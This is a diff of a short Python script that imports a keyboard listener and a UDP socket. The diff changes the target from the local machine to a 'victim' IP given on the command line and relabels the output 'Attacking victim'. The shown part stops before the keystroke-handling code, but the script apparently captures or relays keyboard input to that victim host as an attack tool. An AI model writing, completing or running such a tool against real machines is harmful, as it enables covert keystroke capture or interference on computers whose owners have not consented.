@@ -1,16 +1,16 @@
 #!/usr/bin/env python3
 
+import sys
 from socket import socket, AF_INET, SOCK_DGRAM, gethostbyname_ex, gethostname
 from pynput.keyboard import Key, Listener
 
-# Find the local IP address
-# https://stackoverflow.com/a/1267524
-SERVER_IP   = [l for l in ([ip for ip in gethostbyname_ex(gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket(AF_INET, SOCK_DGRAM)]][0][1]]) if l][0][0]
+# Attack the victim at a given IP address
+SERVER_IP   = sys.argv[1]
 PORT_NUMBER = 5000
 
 SERVER = (SERVER_IP, PORT_NUMBER)
 SIZE = 1024
-print ("Client sending packets to {0}:{1}\n".format(SERVER_IP, PORT_NUMBER))
+print("Attacking victim at {0}:{1}\n".format(SERVER_IP, PORT_NUMBER))
 
 msg_socket = socket( AF_INET, SOCK_DGRAM )
 
